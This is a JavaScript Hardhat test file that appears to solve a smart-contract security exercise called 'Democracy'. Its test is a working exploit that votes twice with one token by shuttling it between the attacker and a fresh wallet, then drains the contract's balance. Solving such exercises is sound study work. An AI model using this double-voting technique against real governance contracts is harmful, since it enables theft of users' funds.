const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Democracy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy({ value });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            const victimContractWithSignature = victimContract.connect(attackerWallet);
            await victimContractWithSignature.nominateChallenger(attackerWallet.address);
            const fundingAmount = ethers.utils.parseEther("0.1"); // Example funding amount
            const provider = attackerWallet.provider;

            const randomWallet1 = ethers.Wallet.createRandom().connect(provider);
            await attackerWallet.sendTransaction({
                to: randomWallet1.address,
                value: fundingAmount,
            });
            const victimContractWithSignatureOfRandomWallet1 = victimContract.connect(randomWallet1);
            await victimContractWithSignature.approve(attackerWallet.address, 1);

            await victimContractWithSignature.transferFrom(attackerWallet.address, randomWallet1.address, 1);
            await victimContractWithSignatureOfRandomWallet1.vote(attackerWallet.address);

            await victimContractWithSignatureOfRandomWallet1.approve(attackerWallet.address, 1);

            await victimContractWithSignatureOfRandomWallet1.transferFrom(
                randomWallet1.address,
                attackerWallet.address,
                1
            );

            await victimContractWithSignature.vote(attackerWallet.address);

            await victimContractWithSignature.withdrawToAddress(attackerWallet.address);
        });

        after(async function () {
            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
            expect(victimContractBalance).to.be.equal("0");
        });
    });
});
